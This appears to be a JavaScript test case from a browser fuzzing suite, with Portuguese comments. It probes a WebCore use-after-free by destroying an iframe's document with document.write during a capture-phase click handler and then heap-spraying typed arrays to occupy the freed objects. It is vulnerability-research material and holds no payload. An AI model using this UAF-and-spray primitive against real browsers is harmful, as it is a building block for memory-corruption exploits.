'use strict';
/**
 * Teste 8 — WebCore: IFrame document.write() Event Teardown UAF
 *
 * Foco: Destruir o Document subjacente de um iframe durante a fase
 * de captura de um evento. O EventDispatcher (C++) tentará continuar
 * a travessia na árvore de nós (Node) que acabaram de ser liberados.
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['8'] = {
    id      : 8,
    name    : 'WebCore.Document — iframe document.write teardown',
    category: 'WebCore-Document-UAF',
    timeout : 5000,

    run: function () {
      var anomalies = [];
      var sandbox = document.createElement('div');
      sandbox.id = 'fuzzer-sandbox-8';
      document.body.appendChild(sandbox);

      (function variantA() {
        try {
          var iframe = document.createElement('iframe');
          sandbox.appendChild(iframe);
          var idoc = iframe.contentDocument;
          if (!idoc) return;

          /* Constrói uma árvore no iframe */
          var div = idoc.createElement('div');
          var btn = idoc.createElement('button');
          div.appendChild(btn);
          idoc.body.appendChild(div);

          var handlerFired = false;

          /* Hook na fase de CAPTURA (desce a árvore) no próprio Document */
          idoc.addEventListener('click', function(e) {
            handlerFired = true;
            
            /* O C++ preparou o caminho: Document -> HTML -> Body -> Div -> Button.
             * Nós destruímos o documento inteiro de forma síncrona. */
            idoc.write('NUKE');
            idoc.close();

            /* O heap spray tenta sobrescrever os objetos Node e EventContext liberados */
            var spray = [];
            for (var i = 0; i < 800; i++) {
              var arr = new Uint32Array(1024);
              arr.fill(0x42424242); // Assinatura clara se houver crash
              spray.push(arr);
            }
          }, true); // Capturing = true

          /* Dispara o evento de forma síncrona.
           * Se vulnerável, o C++ vai tentar acessar 'div' ou 'btn' após o callback
           * para continuar a propagação do evento (bubbling). */
          btn.click();

          /* Validação JS: O botão deveria ser um zumbi desconectado */
          if (handlerFired) {
            if (btn.ownerDocument !== null && typeof btn.ownerDocument.nodeType !== 'number') {
               anomalies.push('A: target do evento mantém ownerDocument corrompido');
            }
          }

        } catch (e) {
          anomalies.push('A: ' + String(e));
        }
      }());

      document.body.removeChild(sandbox);

      if (anomalies.length > 0) return { status: 'ANOMALY', detail: anomalies.join(' | ') };
      return { status: 'PASS', detail: 'EventDispatcher sobreviveu ao document teardown' };
    }
  };

}(window));
